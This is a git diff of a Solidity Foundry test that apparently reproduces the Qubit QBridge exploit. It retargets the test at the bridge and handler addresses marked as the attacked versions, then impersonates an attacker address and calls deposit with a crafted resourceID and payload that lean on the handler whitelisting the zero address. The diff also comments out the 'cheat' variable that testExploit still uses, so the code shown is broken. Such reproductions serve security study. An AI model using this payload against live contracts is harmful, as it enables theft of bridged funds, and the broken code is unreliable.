@@ -4,8 +4,6 @@ pragma solidity 0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-//source code: https://github.com/ChainSafe/chainbridge-solidity/blob/master/contracts/Bridge.sol
-//vulneable: Bridge.sol: L384
 interface IQBridge {
   function deposit(uint8 destinationDomainID, bytes32 resourceID, bytes calldata data) external payable;
 }
@@ -17,15 +15,10 @@ interface IQBridgeHandler {
 }
 
 contract ContractTest is DSTest {
-  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+  //CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
   address attacker = 0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7;
- //contracts sourcecoodee: https://github.com/ChainSafe/chainbridge-solidity/blob/master/contracts/handlers/ERC20Handler.sol
-  
-  //attacked version: 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6; 
-  address QBridge =  0xa513E6E4b8f2a923D98304ec87F64353C4D5C853; 
-  //attacked version: 0x17B7163cf1Dbd286E262ddc68b553D899B93f526; 
-  address QBridgeHandler = 0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6; 
-
+  address QBridge = 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6;
+  address QBridgeHandler = 0x17B7163cf1Dbd286E262ddc68b553D899B93f526;
   CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
   function setUp() public {
@@ -34,10 +27,6 @@ contract ContractTest is DSTest {
 
   function testExploit() public {
     cheat.startPrank(attacker);
-    // emit log_named_uint(
-    //   "Before exploiting, attacker OP Balance:",
-    //   op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
-    // );
     bytes32 resourceID = hex"00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01";
     bytes memory data = hex"000000000000000000000000000000000000000000000000000000000000006900000000000000000000000000000000000000000000000a4cc799563c380000000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7";
     uint option;
@@ -47,7 +36,7 @@ contract ContractTest is DSTest {
     emit log_named_uint("amount", amount);
     // which calls in turn:
     // IQBridgeHandler(QBridgeHandler).deposit(resourceID, attacker, data);
-    //emit log_named_address("contractAddress", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID));
+    emit log_named_address("contractAddress", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID));
     emit log_named_uint("is 0 address whitelisted", IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0)) ? 1 : 0);
 
     IQBridge(QBridge).deposit(1, resourceID, data);
